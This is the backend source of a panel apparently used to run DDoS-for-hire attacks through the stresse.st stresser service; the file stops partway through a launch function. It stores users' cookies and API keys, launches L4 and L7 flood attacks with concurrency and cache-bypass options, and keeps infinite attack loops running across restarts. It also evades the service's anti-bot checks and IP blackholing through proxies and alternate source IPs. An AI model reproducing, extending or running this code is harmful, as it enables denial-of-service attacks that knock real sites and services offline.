/**
 * Loki Panel Backend
 * stresse.st proxy + recon/check tools
 */

const express = require('express');
const cors = require('cors');
const axios = require('axios');
const rateLimit = require('express-rate-limit');
const { CookieJar } = require('tough-cookie');
const net = require('net');
const dns = require('dns');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const { sendTelegram, initTelegram, esc } = require('./telegram');
const phish = require('./phish');
const { initImpact, getImpactForUser } = require('./impact');
const { initInvader, getInvaderState, invaderAddSite, invaderRemoveSite, invaderSetInterval, invaderHistory, runChecks: invaderRunChecks } = require('./invader');
const { initWatch, getState: watchState, addKeyword, removeKeyword, addSite, removeSite, triggerScan } = require('./watch');
const rackghost = require('./rackghost');
const sitewatch = require('./sitewatch');
const sync = require('./sync');

// stresse.st istekleri icin opsiyonel cikis proxy'si (HTTP veya SOCKS5;
// or. http://user:pass@ip:port ya da socks5://127.0.0.1:1080).
// stresse.st bazi sunucu IP'lerine anti-bot dogrulamasi uyguluyor;
// proxy ile istekler temiz IP'den cikar.
const { SocksProxyAgent } = require('socks-proxy-agent');
const { HttpsProxyAgent } = require('https-proxy-agent');
const STRESSE_PROXY = process.env.LOKI_STRESSE_PROXY || '';
let stresseProxyAgent = null;
if (STRESSE_PROXY) {
  stresseProxyAgent = STRESSE_PROXY.startsWith('socks')
    ? new SocksProxyAgent(STRESSE_PROXY)
    : new HttpsProxyAgent(STRESSE_PROXY);
  console.log(`[proxy] stresse.st trafigi proxy uzerinden: ${STRESSE_PROXY.replace(/\/\/.*@/, '//***@')}`);
}
function stresseProxyConfig() {
  if (!stresseProxyAgent) return {};
  // axios'un kendi proxy mantigini kapatip agent'i veriyoruz.
  return { proxy: false, httpAgent: stresseProxyAgent, httpsAgent: stresseProxyAgent };
}

// stresse.st trafigini belirli bir yerel IPv4 adresinden cikarma (or. birincil IP
// blackhole'dayken ikincil IP'ye gecis). Bos ise isletim sistemi secimi kullanilir.
// NOT: axios'un top-level `localAddress` opsiyonu bu surumde yok sayiliyor
// (kaynak IP testiyle kanitlandi); bind, ozel https.Agent ile yapilmali.
const STRESSE_BIND_IP = process.env.LOKI_STRESSE_BIND_IP || '';
let stresseBindAgent = null;
if (STRESSE_BIND_IP) {
  const http = require('http');
  const https = require('https');
  stresseBindAgent = {
    httpAgent: new http.Agent({ localAddress: STRESSE_BIND_IP }),
    httpsAgent: new https.Agent({ localAddress: STRESSE_BIND_IP })
  };
  console.log(`[net] stresse.st trafigi yerel IP'den cikiyor: ${STRESSE_BIND_IP}`);
}
function stresseBindConfig() {
  if (!stresseBindAgent) return {};
  // Bind varsa axios'un kendi proxy mantigini da kapat (agent yolunda kalsin).
  return { proxy: false, ...stresseBindAgent };
}

initTelegram();

// Node 20'nin "Happy Eyeballs" (autoSelectFamily) ozelligi, IPv6'si bozuk/eksik
// sunucularda IPv6 denemesi sirasinda "read ECONNRESET" hatasina yol aciyor.
// Bu yuzden IPv4'u tercih edip autoSelectFamily'i kapatiyoruz.
if (typeof net.setDefaultAutoSelectFamily === 'function') {
  net.setDefaultAutoSelectFamily(false);
}
dns.setDefaultResultOrder('ipv4first');

// Beklenmedik promise rejection'lari yutma: logla ama process'i oldurme.
process.on('unhandledRejection', (err) => {
  console.error('[unhandledRejection]', err);
});

const app = express();
const PORT = process.env.PORT || 3001;

// Nginx gibi bir reverse proxy arkasında calisirken X-Forwarded-For'a given,
// ayni zamanda express-rate-limit uyarisini onler.
app.set('trust proxy', 1);

/**
 * CORS whitelist:
 * - Gelistirme ortamlari (localhost, 127.0.0.1 herhangi port)
 * - LOKI_ALLOWED_ORIGINS env degiskeni ile virgulle ayrilmis domainler
 * Ornek: LOKI_ALLOWED_ORIGINS=https://panel.site.com,https://app.site.com
 */
function getAllowedOrigins() {
  const defaults = [
    /^https?:\/\/localhost(:\d+)?$/,
    /^https?:\/\/127\.0\.0\.1(:\d+)?$/
  ];
  const envOrigins = (process.env.LOKI_ALLOWED_ORIGINS || '')
    .split(',')
    .map((o) => o.trim())
    .filter(Boolean);
  return { defaults, envOrigins };
}

function isOriginAllowed(origin) {
  // Tarayici disi istemcilerde origin hic olmayabilir; onlara izin ver.
  // Ancak 'undefined'/'null' STRING'i (sandboxed iframe senaryolari) kabul edilmez.
  if (!origin) return true;
  if (origin === 'undefined' || origin === 'null') return false;
  const { defaults, envOrigins } = getAllowedOrigins();
  if (defaults.some((re) => re.test(origin))) return true;
  if (envOrigins.includes(origin)) return true;
  return false;
}

app.use(cors({
  origin: (origin, callback) => {
    if (isOriginAllowed(origin)) {
      callback(null, origin);
    } else {
      callback(new Error(`CORS policy: origin '${origin}' not allowed`));
    }
  },
  credentials: true,
  exposedHeaders: ['sessionId', 'content-type']
}));
app.use(express.json());

// Rate limiting: frontend polling (loop list + ongoing + history) dakikada
// 60+ istek atabildigi icin limiti yukseltiyoruz.
const limiter = rateLimit({
  windowMs: 60 * 1000,
  max: 500,
  message: { status: 'error', message: 'Too many requests' }
});
app.use('/api', limiter);

// In-memory session store: { sessionId: { jar: CookieJar, username } }
const sessions = {};

// Active loop registry: { loopId: { running, params, startedAt, lastRoundAt, roundCount, errors, roundAttackIds } }
const activeLoops = {};

// Global loop scheduler: her loop bagimsiz calisir. Ayni loopId'den ayni anda
// sadece 1 tur calisir.
let loopQueue = [];
let isProcessingLoopQueue = false;
const activeLoopRounds = new Set();

// Active normal attacks registry: { attackId: { username, host, port, method, time, startedAt, expiresAt } }
const activeAttacks = {};

// Basit upstream cache'leri: upstream yavas/hata verdiginde bayat veriyle idare et.
// methods herkes icin ayni (global, TTL 1 saat); plan kullanici bazli (TTL 5 dk).
const METHODS_CACHE_TTL_MS = 60 * 60 * 1000;
const PLAN_CACHE_TTL_MS = 5 * 60 * 1000;
const methodsCache = { data: null, fetchedAt: 0 };
const planCache = new Map(); // username -> { data, fetchedAt }

// Upstream istegini 1 kez retry'la dener: ilk deneme hata/timeout verirse
// 2sn bekleyip ikinci denemeyi yapar. Ikinci deneme de patlarsa hata firlatir.
async function fetchWithRetry(fn, label) {
  try {
    return await fn();
  } catch (err) {
    console.warn(`[retry] ${label} ilk deneme basarisiz (${err.message}), 2sn sonra tekrar deneniyor`);
    await new Promise((r) => setTimeout(r, 2000));
    return fn();
  }
}

// Attack history registry: { historyId: { username, target, port, method, time, concurrents, loop, status, startedAt, endedAt } }
const attackHistory = {};

// Persistence: save/restore sessions, loops, attacks and history across restarts
const DATA_DIR = path.join(__dirname, 'data');
const SESSIONS_FILE = path.join(DATA_DIR, 'sessions.json');
const LOOPS_FILE = path.join(DATA_DIR, 'active-loops.json');
const ATTACKS_FILE = path.join(DATA_DIR, 'active-attacks.json');
const HISTORY_FILE = path.join(DATA_DIR, 'attack-history.json');
const API_TOKENS_FILE = path.join(DATA_DIR, 'api-tokens.json');
const GROUPS_FILE = path.join(DATA_DIR, 'attack-groups.json');

// Gruplar (ortak panel): loop/saldiri gruplama. [{ id, name, createdAt }]
// Loop/attack kayitlarina group (isim) yazilir; grup silinince kayitlar
// grupsuza doner (group alani temizlenir, islem durmaz).
let attackGroups = (() => {
  try { return JSON.parse(fs.readFileSync(GROUPS_FILE, 'utf8')); } catch { return []; }
})();

function saveGroups() {
  // Atomic yazma (safeWriteJson kalibi): yazim ortasinda crash gruplari bozmaz
  safeWriteJson(GROUPS_FILE, attackGroups);
}

// Ismiyle grup bul veya olustur; grup adi dondurur (null = grupsuz).
// Buyuk-kucuk harf duyarsiz: "Milan" ile "milan" ayni grup sayilir.
function resolveGroupName(name, owner = null) {
  const n = String(name || '').trim();
  if (!n) return null;
  // Hesap bazli: ayni isim baska hesapta varsa bu hesap icin ayri grup olusur.
  // (Looplar hesap izolasyonlu; gruplar da oyle.)
  const nLow = n.toLocaleLowerCase('tr');
  const existing = attackGroups.find((g) =>
    g.name.toLocaleLowerCase('tr') === nLow && (g.owner || null) === owner);
  if (existing) return existing.name;
  attackGroups.push({ id: `grp_${Date.now()}_${Math.random().toString(36).slice(2, 7)}`, name: n, owner, createdAt: new Date().toISOString() });
  saveGroups();
  console.log(`[groups] yeni grup: ${n} (${owner || 'ortak'})`);
  return n;
}

function deleteGroup(name, ctx = {}) {
  const owner = ctx.username || null;
  const nLow = name.toLocaleLowerCase('tr');
  attackGroups = attackGroups.filter((g) => !(g.name.toLocaleLowerCase('tr') === nLow && ((g.owner || null) === owner || !g.owner)));
  // Gruptaki loop'lar da kaldırılır (grubu silmek = icerigiyle birlikte silmek)
  const stopped = [];
  Object.keys(activeLoops).forEach((loopId) => {
    if (String(activeLoops[loopId].group || '').toLocaleLowerCase('tr') !== nLow) return;
    if (owner && getLoopOwner(activeLoops[loopId]) !== owner) return; // baska hesabin loop'u dokunma
    stopped.push(activeLoops[loopId]);
    activeLoops[loopId].running = false;
    delete activeLoops[loopId];
  });
  stopped.forEach((loop) => notifyLoopRemoved(loop, 'durduruldu', {
    username: ctx.username,
    ip: ctx.ip,
    stopDetail: `"${name}" grubu kaldırıldı`
  }));
  // Dogrudan saldirilarin grup etiketi temizlenir (islem durmaz)
  Object.values(activeAttacks).forEach((a) => { if (a.group && a.group.toLocaleLowerCase('tr') === nLow) delete a.group; });
  saveGroups();
  saveState();
  return stopped.length;
}

// Hesap bazli token deposu: { username: apiToken }
function readApiTokens() {
  try {
    if (fs.existsSync(API_TOKENS_FILE)) {
      return JSON.parse(fs.readFileSync(API_TOKENS_FILE, 'utf8'));
    }
  } catch (err) {
    console.error('[apiToken] Token dosyasi okunamadi:', err.message);
  }
  return {};
}

function writeApiToken(username, apiToken) {
  if (!username || !apiToken) return;
  try {
    const tokens = readApiTokens();
    tokens[username] = apiToken;
    ensureDataDir();
    // Atomic yazim (tmp+rename): yazim ortasinda crash tum hesaplarin token
    // fallback'ini siliyordu (loop'lar 401 ile olurdu).
    safeWriteJson(API_TOKENS_FILE, tokens);
  } catch (err) {
    console.warn('[apiToken] Token dosyasi yazilamadi:', err.message);
  }
}

// Hesap bazli fallback: sadece ISTENEN hesabin key'i doner.
// Cok hesapli kurulumda baska hesabin key'i capraz kullanilmaz.
function getFallbackApiToken(username) {
  if (!username) return '';
  return readApiTokens()[username] || '';
}

// stresse.st'te API key yenilenirse (Generate Token) eski key 401 dondurur.
// Web oturumu (cookie) uzerinden guncel key'i cekip session'a ve fallback
// dosyasina yazar; boylece loop'lar key yenilenmesinde olmez.
async function refreshApiToken(sessionId) {
  try {
    const client = getClient(sessionId);
    const tokenRes = await client.get('/getApiToken');
    const apiToken = tokenRes.data?.apitoken || tokenRes.data?.token || tokenRes.data?.apiToken || null;
    if (!apiToken) return null;
    sessions[sessionId].apiToken = apiToken;
    writeApiToken(sessions[sessionId]?.username, apiToken);
    saveState();
    console.log(`[apiToken] Guncel API token yenilendi: ${apiToken.slice(0, 8)}...`);
    return apiToken;
  } catch (err) {
    console.warn(`[apiToken] Token yenileme basarisiz: ${err.message}`);
    return null;
  }
}

let saveStateRunning = false;
let saveStatePending = false;

function ensureDataDir() {
  if (!fs.existsSync(DATA_DIR)) {
    fs.mkdirSync(DATA_DIR, { recursive: true });
  }
}

function safeWriteJson(filePath, data) {
  try {
    const tmp = `${filePath}.tmp`;
    fs.writeFileSync(tmp, JSON.stringify(data, null, 2));
    fs.renameSync(tmp, filePath);
    // Sadece sahibin okuyabilecegi izinler (deploy ortaminda onemli)
    try {
      fs.chmodSync(filePath, 0o600);
    } catch (chmodErr) {
      // Windows gibi platformlarda chmod desteklenmeyebilir, gormezden gel
    }
  } catch (err) {
    console.error(`[persistence] Failed to write ${filePath}:`, err.message);
  }
}

function saveState() {
  if (saveStateRunning) {
    saveStatePending = true;
    return;
  }
  saveStateRunning = true;

  try {
    ensureDataDir();

    // Save sessions: serialize CookieJar to JSON
    const sessionsToSave = {};
    Object.entries(sessions).forEach(([sessionId, session]) => {
      try {
        sessionsToSave[sessionId] = {
          username: session.username,
          user: session.user,
          plan: session.plan,
          apiToken: session.apiToken || null,
          createdAt: session.createdAt,
          jar: session.jar.toJSON()
        };
      } catch (err) {
        console.error(`[persistence] Failed to serialize session ${sessionId}:`, err.message);
      }
    });
    safeWriteJson(SESSIONS_FILE, sessionsToSave);

    // Save loops: only serializable fields
    safeWriteJson(LOOPS_FILE, activeLoops);

    // Save normal attacks
    safeWriteJson(ATTACKS_FILE, activeAttacks);

    // Save attack history
    safeWriteJson(HISTORY_FILE, attackHistory);

    cleanupOldSessions();
  } finally {
    saveStateRunning = false;
    if (saveStatePending) {
      saveStatePending = false;
      setImmediate(saveState);
    }
  }
}

function loadState() {
  ensureDataDir();

  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const raw = fs.readFileSync(SESSIONS_FILE, 'utf8');
      const parsed = JSON.parse(raw);
      Object.entries(parsed).forEach(([sessionId, data]) => {
        try {
          sessions[sessionId] = {
            username: data.username,
            user: data.user,
            plan: data.plan,
            apiToken: data.apiToken || null,
            createdAt: data.createdAt || new Date().toISOString(),
            jar: CookieJar.fromJSON(data.jar)
          };
        } catch (err) {
          console.error(`[persistence] Failed to restore session ${sessionId}:`, err.message);
        }
      });
      console.log(`[persistence] Restored ${Object.keys(sessions).length} session(s)`);
    }
  } catch (err) {
    console.error('[persistence] Failed to load sessions:', err.message);
    try {
      fs.renameSync(SESSIONS_FILE, `${SESSIONS_FILE}.corrupt.${Date.now()}`);
    } catch (renameErr) {
      console.error('[persistence] Failed to backup corrupt sessions file:', renameErr.message);
    }
  }

  try {
    if (fs.existsSync(LOOPS_FILE)) {
      const raw = fs.readFileSync(LOOPS_FILE, 'utf8');
      const parsed = JSON.parse(raw);
      Object.entries(parsed).forEach(([loopId, loop]) => {
        // Eski formattaki loop'lari at: URL protokolu iceren host, buyuk harfli method,
        // veya schemaVersion olmayan kayitlar. Bu loop'lar yeni kodla calismaz ve
        // sonsuz hata uretirler. RackGhost loop'lari method'u BUYUK harf tasir
        // (onlarin API'si oyle istiyor); buyuk-harf kontrolu onlara uygulanmaz.
        const host = loop.params?.host || '';
        const method = loop.params?.method || '';
        const isRackghost = loop.params?.provider === 'rackghost';
        const isOldFormat =
          /^https?:\/\//i.test(host) ||
          (!isRackghost && method !== method.toLowerCase()) ||
          !loop.schemaVersion;
        if (isOldFormat) {
          console.log(`[persistence] Eski format loop atildi: ${loopId}`);
          return;
        }
        // Only restore infinite loops; finite loops with at least one round are considered done
        if (loop.params?.infinite && loop.running !== false) {
          // Senkron uyeligini initSync kurar (sync-groups.json'dan). Diskten
          // gelen syncGroup/syncTime'i TASIMA: grup dosyasi kaybolmussa loop
          // kuyruktan sonsuza atlanip hic tur atmayan hayalet olur.
          delete loop.syncGroup;
          delete loop.syncTime;
          activeLoops[loopId] = { ...loop, running: true, roundAttackIds: [] };
        }
      });
      console.log(`[persistence] Restored ${Object.keys(activeLoops).length} infinite loop(s)`);

      // Geri yuklenen loop'larin motorunu tekrar calistir
      Object.keys(activeLoops).forEach((loopId) => {
        console.log(`[persistence] Restarting loop ${loopId}`);
        runLoop(loopId).catch((err) => console.error(`[persistence] runLoop ${loopId} hatasi:`, err));
      });
    }
  } catch (err) {
    console.error('[persistence] Failed to load loops:', err.message);
    try {
      fs.renameSync(LOOPS_FILE, `${LOOPS_FILE}.corrupt.${Date.now()}`);
    } catch (renameErr) {
      console.error('[persistence] Failed to backup corrupt loops file:', renameErr.message);
    }
  }

  cleanupOldSessions();

  // Restore normal attacks
  try {
    if (fs.existsSync(ATTACKS_FILE)) {
      const raw = fs.readFileSync(ATTACKS_FILE, 'utf8');
      const parsed = JSON.parse(raw);
      Object.entries(parsed).forEach(([attackId, attack]) => {
        // Sadece gecerli session'a sahip saldirilari geri yukle
        if (!attack || !sessions[attack.sessionId]) return;
        // Sema dogrulama: time/expiresAt eksik veya bozuk kayitlar geri yuklenmez;
        // bunlar /ongoing uzatma mantiginda clampsuz kalip olumsuzlesiyordu.
        const t = parseInt(attack.time, 10);
        const expMs = new Date(attack.expiresAt || 0).getTime();
        if (!Number.isFinite(t) || t <= 0 || !Number.isFinite(expMs)) return;
        // Sisme korumasi: expiresAt asla startedAt + time + 5dk toleransi asamaz
        const startedMs = new Date(attack.startedAt || 0).getTime();
        const maxExp = (Number.isFinite(startedMs) ? startedMs : expMs - t * 1000) + (t + 300) * 1000;
        if (expMs > maxExp) attack.expiresAt = new Date(maxExp).toISOString();
        activeAttacks[attackId] = attack;
      });
      console.log(`[persistence] Restored ${Object.keys(activeAttacks).length} attack(s)`);
    }
  } catch (err) {
    console.error('[persistence] Failed to load attacks:', err.message);
    try {
      fs.renameSync(ATTACKS_FILE, `${ATTACKS_FILE}.corrupt.${Date.now()}`);
    } catch (renameErr) {
      console.error('[persistence] Failed to backup corrupt attacks file:', renameErr.message);
    }
  }

  cleanupExpiredAttacks();

  // Restore attack history
  try {
    if (fs.existsSync(HISTORY_FILE)) {
      const raw = fs.readFileSync(HISTORY_FILE, 'utf8');
      const parsed = JSON.parse(raw);
      Object.entries(parsed).forEach(([historyId, record]) => {
        if (record && record.username) {
          attackHistory[historyId] = record;
        }
      });
      console.log(`[persistence] Restored ${Object.keys(attackHistory).length} history record(s)`);
    }
  } catch (err) {
    console.error('[persistence] Failed to load attack history:', err.message);
    try {
      fs.renameSync(HISTORY_FILE, `${HISTORY_FILE}.corrupt.${Date.now()}`);
    } catch (renameErr) {
      console.error('[persistence] Failed to backup corrupt history file:', renameErr.message);
    }
  }

  cleanupOldHistory();
}

// Auto-save every 30 seconds
setInterval(saveState, 30000);

function buildTargetUrl(host, port) {
  if (!host) return '';
  const cleanHost = host.trim().replace(/\/$/, '');
  if (!cleanHost) return '';
  // Zaten URL ise portu URL API ile birlestir
  if (/^https?:\/\//i.test(cleanHost)) {
    try {
      const url = new URL(cleanHost);
      if (port && parseInt(port) > 0) url.port = String(port);
      return url.toString().replace(/\/$/, '');
    } catch {
      return port ? `${cleanHost}:${port}` : cleanHost;
    }
  }
  return port ? `${cleanHost}:${port}` : cleanHost;
}

// Kayit defteri <-> upstream satir eslemesi icin normalize imza.
// stresse /ongoing bazi satirlari attack_id: null donduruyor; ID tekillestirmesi
// bu satirlari yakalayamadigindan ayni saldiri iki kez sayiliyordu. Hedef+yontem
// imzasiyla butceleme yapilir: protokol ve sondaki slash'lar atilir, kucuk harf.
function rowSigKey(target, method) {
  let t = String(target || '').toLowerCase().replace(/^https?:\/\//, '').replace(/\/+$/, '');
  // L7 upstream hedefi 'host/:443' biciminde gelebilir; 'host:443'e indir
  t = t.replace(/^([^/]+)\/:(\d+)$/, '$1:$2');
  if (!t || !method) return null;
  return `${t}|${String(method).toUpperCase()}`;
}

async function stopAttackApi(apiClient, apiToken, attackId) {
  const url = `https://stresse.st/stop?id=${encodeURIComponent(attackId)}&key=${encodeURIComponent(apiToken)}`;
  const res = await apiClient.get(url);
  return res.data;
}

function buildApiUrl(apiToken, params) {
  const isL7 = params.layer === 'L7';
  // L7'de path/query korunur (cache-bypass); L4'te sade bare host kullanilir.
  const host = isL7 ? buildL7HostWithProtocol(params.host) : normalizeHost(params.host);
  const geo = params.geo || 'worldwide';
  const method = String(params.method || '');
  const url = `https://stresse.st/api?key=${encodeURIComponent(apiToken)}&host=${encodeURIComponent(host)}&port=${params.port}&time=${params.time}&method=${encodeURIComponent(method)}&conc=${params.concurrents || 1}&geo=${encodeURIComponent(geo)}`;
  console.log(`[buildApiUrl] layer=${params.layer || 'L4'} host=${host} method=${method} time=${params.time} geo=${geo} conc=${params.concurrents || 1}`);
  return url;
}

// Method congestion tracking: stresse.st returns HTTP 429
// "All slots for method X are busy." or launches fewer IDs than requested
// when a method's slot pool is full. Track per-method state so the panel can
// show a "Yogun" badge. Entries expire CONGESTION_TTL_MS after the last
// busy/ok signal; expiry is evaluated at read time, no timer needed.
const methodCongestion = new Map(); // method(lower) -> { busy, lastBusyAt, lastOkAt }
const CONGESTION_TTL_MS = 15 * 60 * 1000;

function markMethodBusy(method) {
  const key = String(method || '').toLowerCase();
  if (!key) return;
  const prev = methodCongestion.get(key) || {};
  methodCongestion.set(key, { busy: true, lastBusyAt: Date.now(), lastOkAt: prev.lastOkAt || null });
}

function markMethodOk(method) {
  const key = String(method || '').toLowerCase();
  if (!key) return;
  const prev = methodCongestion.get(key) || {};
  methodCongestion.set(key, { busy: false, lastBusyAt: prev.lastBusyAt || null, lastOkAt: Date.now() });
}

// Drop entries whose last signal is older than the TTL, then return a
// JSON-ready snapshot: { "http-tempesta": { busy, since }, ... }
function getMethodCongestionSnapshot() {
  const now = Date.now();
  const out = {};
  for (const [key, entry] of methodCongestion) {
    const lastSignal = Math.max(entry.lastBusyAt || 0, entry.lastOkAt || 0);
    if (now - lastSignal > CONGESTION_TTL_MS) {
      methodCongestion.delete(key);
      continue;
    }
    out[key] = { busy: !!entry.busy, since: entry.busy ? entry.lastBusyAt : entry.lastOkAt };
  }
  return out;
}

// HTTP 429 or any error whose message mentions slots + busy means the
// method's slot pool is full upstream.
function isSlotsBusyError(err, fallbackMessage = '') {
  const status = err?.response?.status;
  const msg = String(err?.response?.data?.message || fallbackMessage || err?.message || '').toLowerCase();
  return status === 429 || (msg.includes('slots') && msg.includes('busy'));
}

async function startAttackApi(apiClient, params) {
  const url = buildApiUrl(params.apiToken, params);
  // stresse.st'in /api ucu yuk altinda (ozellikle L7 methodlarda da) 15sn'yi
  // asabiliyor; timeout turu olduruyor. L4/L7 icin esit, genis timeout ver.
  const timeout = 60000;
  try {
    const res = await apiClient.get(url, { timeout });
    console.log(`[startAttackApi] status=${res.status} data=${JSON.stringify(res.data).slice(0, 400)}`);
    if (res.data?.status === 'error') {
      if (isSlotsBusyError(null, res.data.message)) markMethodBusy(params.method);
      throw new Error(res.data.message || 'API attack failed');
    }
    return res.data;
  } catch (err) {
    if (isSlotsBusyError(err)) markMethodBusy(params.method);
    if (err.response) {
      console.error(`[startAttackApi] HTTP ${err.response.status} error:`, JSON.stringify(err.response.data).slice(0, 400));
    } else {
      console.error(`[startAttackApi] request error:`, err.message);
    }
    throw err;
  }
}

// Kurtarma icin imza-bazli satir sayimi: upstream /ongoing'de bu hedef+yontem
// kac satir gorunuyor. attack_id'siz (null) methodlarda ID kurtarmasi hic
// calismadigi icin timeout/5xx sonrasi tek guvenilir sinyal satir sayisi.
async function fetchOngoingSigCount(sessionId, params) {
  try {
    const session = sessions[sessionId];
    if (!session?.username) return 0;
    const webClient = getClient(sessionId);
    const res = await webClient.get(`/ongoing/${session.username}`, { timeout: 15000 });
    const list = Array.isArray(res.data) ? res.data : (res.data?.attacks || []);
    const sig = rowSigKey(buildTargetUrl(params.host, params.port), params.method);
    if (!sig) return 0;
    return list.filter((a) => rowSigKey(a.target || a.host, a.method) === sig).length;
  } catch {
    return 0;
  }
}

// Imza kurtarmayi birkaç kez dene: upstream /ongoing 5-15sn gecikmeli
// guncellenir; tek bakista 0 gormek yanlis negatif (ve retry -> cift launch)
// dogurur.
async function sigSalvage(sessionId, params) {
  for (let i = 0; i < 3; i++) {
    await new Promise((r) => setTimeout(r, 5000));
    const n = await fetchOngoingSigCount(sessionId, params);
    if (n > 0) return n;
  }
  return 0;
}

// Bazi stresse methodlari istegin concurrents degerinin 2 katini baslatir
// (HTTP-REST: conc=10 -> 20 saldiri/20 slot, canli olcumle dogrulandi).
// Kullanici girdigi kadar saldiri VE slot tuketsin diye upstream'e yarisi
// gonderilir (tek sayida yukari yuvarlanir: 7 -> 4 gonder, 8 acilir).
const STRESSE_DOUBLE_LAUNCH = new Set(['http-rest']);
function stresseSendConc(method, conc) {
  const c = parseInt(conc, 10) || 1;
  return STRESSE_DOUBLE_LAUNCH.has(String(method || '').toLowerCase())
    ? Math.max(1, Math.ceil(c / 2))
    : c;
}

async function launchAttacksGet(sessionId, params, concurrents, loopId = null) {
  const session = sessions[sessionId];
  if (!session || !session.apiToken) {
    throw new Error('API token not available');
  }

  // 2x methodlarda upstream'e yarisi gonderilir; dogrulama esikleri de buna gore.
  const sendConc = stresseSendConc(params.method, concurrents);

  // Once /ongoing'den mevcut ID'leri al.
  const beforeIds = new Set(await fetchOngoingAttackIds(sessionId, params, 1000));

  // Tek istekte istenen concurrents kadar saldiri baslat.
  // Istegin baslangic zamanini tut; timeout kurtarmasinda sadece bu istekten
  // SONRA baslamis saldirilari kurtar (baska kullanicininkileri degil).
  const requestStartedAt = Date.now();
  let data;
  try {
    data = await startAttackApi(getApiClient(sessionId), {
      apiToken: session.apiToken,
      ...params,
      concurrents: sendConc
    });
  } catch (err) {
    // API key stresse.st'te yenilenmisse (Generate Token) eski key 401 verir.
    // Web oturumu uzerinden guncel key'i cekip launch'i bir kez tekrarla.
    if (err.response?.status === 401) {
      console.warn(`[launchAttacksGet] 401 (Invalid API key); guncel token cekilip tekrar denenecek...`);
      const freshToken = await refreshApiToken(sessionId);
      if (!freshToken) {
        console.error(`[launchAttacksGet] GET /api hata:`, err.message);
        throw err;
      }
      data = await startAttackApi(getApiClient(sessionId), {
        apiToken: freshToken,
        ...params,
        concurrents: sendConc
      });
    } else if (err.code === 'ECONNABORTED' || /timeout/i.test(err.message || '')) {
      // Timeout'ta istek bizden dustu ama stresse.st saldirilari baslatmis olabilir.
      // /ongoing uzerinden yeni ID'leri kurtarmayi dene; yoksa gercek hata say.
      console.warn(`[launchAttacksGet] GET /api timeout; /ongoing'den kurtarma deneniyor...`);
      await new Promise((r) => setTimeout(r, 4000));
      const salvageIds = new Set(await fetchOngoingAttackIds(sessionId, params, 1000, requestStartedAt));
      const recovered = [...salvageIds].filter((id) => !beforeIds.has(id)).slice(0, sendConc);
      if (recovered.length > 0) {
        console.log(`[launchAttacksGet] timeout'a ragmen ${recovered.length} saldiri kurtarildi`);
        // Aninda gorunurluk: kurtarilan ID'leri hemen kaydet
        recovered.forEach((id) => registerAttack(String(id), sessionId, params, loopId, 1, Math.round((Date.now() - requestStartedAt) / 1000)));
        return {
          data: { status: 'success', recovered: true },
          attackIds: recovered,
          elapsedSec: Math.round((Date.now() - requestStartedAt) / 1000),
          pendingIds: []
        };
      }
      // ID kurtarma attack_id'siz methodlarda (L4/L7 null-id) hic calismaz.
      // Son care: imza sayisi — satir varsa saldirilar upstream'te baslamistir;
      // hata saymak backoff retry'i tetikler ve ayni launch IKINCI KEZ gider
      // (10 istenen HTTP-REST'in 19/20 gorunmesinin sebebi buydu).
      const sigCount = await sigSalvage(sessionId, params);
      if (sigCount > 0) {
        console.log(`[launchAttacksGet] timeout ama upstream'te ${sigCount} satir var (imza kurtarma); yeniden launch EDILMIYOR`);
        return {
          data: { status: 'success', recovered: true, sigRecovered: true },
          attackIds: [],
          elapsedSec: Math.round((Date.now() - requestStartedAt) / 1000),
          // Aninda gorunurluk: upstream satirlari var ama ID'leri yok; pending
          // satirlar hemen gorunsun, null-id butcesi tekillestirir.
          pendingIds: registerPendingAttacks(sessionId, params, sendConc, loopId)
        };
      }
      console.error(`[launchAttacksGet] GET /api hata:`, err.message);
      throw err;
    } else if (err.response && err.response.status >= 500) {
      // 502/503/504: stresse gateway yuk altinda; istek islenmis ve saldirilar
      // baslamis olabilir. Imza sayisiyla dogrula — baslamissa hata sayma,
      // yoksa retry cift launch uretir.
      console.warn(`[launchAttacksGet] GET /api ${err.response.status}; imza kurtarma deneniyor...`);
      const sigCount = await sigSalvage(sessionId, params);
      if (sigCount > 0) {
        console.log(`[launchAttacksGet] ${err.response.status}'e ragmen upstream'te ${sigCount} satir var; yeniden launch EDILMIYOR`);
        return {
          data: { status: 'success', recovered: true, sigRecovered: true },
          attackIds: [],
          elapsedSec: Math.round((Date.now() - requestStartedAt) / 1000),
          pendingIds: registerPendingAttacks(sessionId, params, sendConc, loopId)
        };
      }
      console.error(`[launchAttacksGet] GET /api hata:`, err.message);
      throw err;
    } else {
      console.error(`[launchAttacksGet] GET /api hata:`, err.message);
      throw err;
    }
  }

  // API response'undaki attack_id'leri al.
  let responseIds = [];
  if (Array.isArray(data?.attack_id)) {
    responseIds = data.attack_id;
  } else if (data?.attack_id) {
    responseIds = [data.attack_id];
  } else if (data?.id) {
    responseIds = [data.id];
  }

  // ANINDA GORUNURLUK: upstream'in /ongoing'e dusmesini (5-15sn) ve ID
  // dogrulamasini beklemeden kaydet — satir ~1-2sn'de panele duser.
  // ID'li methodlarda gercek ID'lerle; ID'siz (L4 null-id) methodlarda pending
  // satirlarla. Pending'ler gercek ID'ler dogrulaninca asagida silinir.
  let pendingIds = [];
  const instantIds = new Set(); // az once biz kaydettik — diff bunlari elememeli
  if (data?.status === 'success' || data?.message === 'Attack started') {
    if (responseIds.length > 0) {
      responseIds.slice(0, sendConc).forEach((id) => {
        registerAttack(String(id), sessionId, params, loopId, 1, 0);
        instantIds.add(String(id));
      });
    } else {
      pendingIds = registerPendingAttacks(sessionId, params, sendConc, loopId);
    }
  }

  // Ongoing listesinin guncellenmesi icin kisa bekle.
  await new Promise((r) => setTimeout(r, 4000));

  // Sadece bu istekten SONRA baslamis saldirilari aday goster; aksi halde ayni
  // host+method'a tur atan loop'larin ID'leri bu launch'a yanlislikla yazilir.
  const afterIds = new Set(await fetchOngoingAttackIds(sessionId, params, 1000, requestStartedAt));

  // Onceki /ongoing'de olmayan ve baska bir launch/loop'a zaten kayitli olmayan
  // yeni ID'leri tespit et. (Aninda kaydedilen instantIds defterde zaten var —
  // onlari eleme; yoksa basarili launch "dogrulanamadi" gorunur.)
  const notRegisteredElsewhere = (id) => !activeAttacks[id] || instantIds.has(String(id));
  let newIds = responseIds.filter((id) => !beforeIds.has(id) && notRegisteredElsewhere(id));

  // Eger response'taki ID'lerin hepsi eskiyse (tum aktifler listesi ise),
  // after - before diff'inden yeni ID'leri cikar.
  if (newIds.length === 0 && afterIds.size > beforeIds.size) {
    newIds = [...afterIds].filter((id) => !beforeIds.has(id) && notRegisteredElsewhere(id));
  }

